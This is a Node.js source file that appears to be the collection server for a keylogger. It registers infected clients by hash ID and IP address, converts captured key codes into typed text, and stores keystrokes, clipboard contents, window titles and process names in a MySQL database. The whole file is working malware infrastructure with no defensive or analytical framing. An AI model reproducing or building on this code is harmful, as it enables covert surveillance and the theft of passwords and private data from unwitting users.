const mysql = require('mysql');
const log = require('./log.js');
const keyTable = require('./keycodes.json');

var databaseConfigObj  = {
    host     : 'localhost',
    user     : 'root',
    password : '',
    database : 'lrc'
};
var database = mysql.createConnection(databaseConfigObj);

//die if database is offline
database.connect(function(err) {
    if(err != null) {
        console.log(err);
        throw err;
    }
});

function resolveKeyCodes(keyCodes) {
    var text = '';

    for (var i = 0; i < keyCodes.length; i++) {

        var key = keyCodes[i];
        var keyCase = (key.flags == 0x0 || key.flags == 0x3) ? "lower" : "upper";

        if (keyTable['default']['both'][key.keyCode] != undefined) {
            text += keyTable['default']['both'][key.keyCode];
            continue;
        }

        if (keyTable['default'][keyCase] != undefined) {

            if (keyTable['default'][keyCase][key.keyCode] != undefined) {
                text += keyTable['default'][keyCase][key.keyCode];
                continue;
            }
        }

        if (keyTable[key.lang] != undefined) {
            if (keyTable[key.lang][keyCase] != undefined) {
                if (keyTable[key.lang][keyCase][key.keyCode] != undefined) {
                    text += keyTable[key.lang][keyCase][key.keyCode];
                    continue;
                }
            }
        }
    }

    return text;
}

function insertInToDatabase (sql, values) {
    database.query(sql , values, function (err, rows, fields) {
        if (err != null) {
            log.error(err);
        }
    });
}

function saveKeyboard (userId , lrcdata) {
    var sql = 'INSERT INTO keyboard (userId,process,title,text,eventTime) VALUES ( ?,?,?,?,FROM_UNIXTIME(?))';

    var items = lrcdata.data.items;
    items.forEach(function(item) {
        var text = resolveKeyCodes(item.keys);

        if(text == '')
        {
            text = null;
        }
        console.log("TEXT : " + text);
        var values = [userId, item.wndInfo.process, item.wndInfo.title, text, item.wndInfo.time];
        insertInToDatabase(sql, values);
    });
}

function saveClipboard (userId , lrcdata) {
    var sql = 'INSERT INTO clipboard (userId, process, title, text, eventTime) VALUES ( ?,?,?,?,FROM_UNIXTIME(?))';

    var items = lrcdata.data.items;
    items.forEach(function(item) {
        var values = [userId, item.wndInfo.process, item.wndInfo.title, item.data, item.wndInfo.time];
        insertInToDatabase(sql,values);
    });
}

function saveData(userId , lrcdata) {
    switch (lrcdata.type){
        //error
        case 0:
            log.error(lrcdata.data.message);
            break;
        //keyboard
        case 1:
            saveKeyboard(userId,lrcdata);
            break;
        //clipboard
        case 2:
            saveClipboard(userId,lrcdata);
            break;
    }
}

//Validate sha256
function checkSha256 (sha256) {
    if(sha256.length != 64) {
        return false ;
    }

    //Checks for valid characters
    for (var i = 0; i < sha256.length; i++) {
        var code = sha256.charCodeAt(i);
        if (code < 48 || code > 102) {
            return false;
        }
    }
    return true;
}

//Add user to database, then return id.
function insertUser (ws , sha256 , callback) {
    var sql = 'INSERT INTO users (shaId , ip) VALUES (?, ?)';
    var values = [sha256 , ws._socket.remoteAddress];

    //Insert user data to database
    database.query(sql , values, function (err, rows, fields) {
        if(err != null){
            log.error('Failed to INSERT user: ' + err);
            callback(false);
        }
        else {
            callback(rows.insertId, sha256)
        }
    });
}
//Returns id from database by sha256
function getUserId ( ws, sha256, callback) {
    if(!checkSha256(sha256)) {
        callback(false);
    }

    //Find user with given sha256
    database.query('SELECT id FROM users WHERE ? LIMIT 1', {shaId : sha256} , function (err, rows, fields) {
        if (err != null) {
            log.error('Failed to SELECT id: ' + err);
            callback(false);
        }
        else {
            if (rows.length === 0) {
                //write user to database
                insertUser(ws, sha256, callback);
            }
            else {
                callback(rows[0]['id'], sha256);
            }
        }
    });
}

module.exports.getUserId = getUserId;
module.exports.saveData = saveData;